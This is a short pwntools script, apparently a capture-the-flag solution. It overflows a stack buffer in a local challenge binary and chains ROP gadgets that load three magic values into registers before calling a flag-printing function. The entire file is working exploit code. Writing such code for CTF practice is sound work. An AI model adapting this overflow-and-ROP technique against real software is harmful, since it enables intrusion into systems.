from pwn import *

context.log_level='debug'
context.terminal = ["tmux", "splitw", "-h","-p","60"]

def find_offset(p):
    p.sendline(cyclic(500, n=8))
    p.wait()
    core = p.corefile
    print(cyclic_find(core.read(core.rsp, 8), n=8))

elf=ELF("./chal")
p=elf.process()

flag_func=0x04011f6
pop_rdi_ret=0x0000000000401351
pop_rsi_ret=0x000000000040134d
pop_rdx_ret=0x000000000040134f
#p=remote("host",port)


payload=(b"a"*24)
payload+=p64(pop_rdi_ret)
payload+=p64(0xdeadbeefdeadbeef)
payload+=p64(pop_rsi_ret)
payload+=p64(0xc0debabec0debabe)
payload+=p64(pop_rdx_ret)
payload+=p64(0xcacadadacacadada)
payload+=p64(flag_func)

gdb.attach(p,
           '''
           b* 0x04011f6
           b* 0x0401218
           ''')

p.sendlineafter(b"Welcome to the system. What is your name:", payload)
p.recvline()
p.interactive()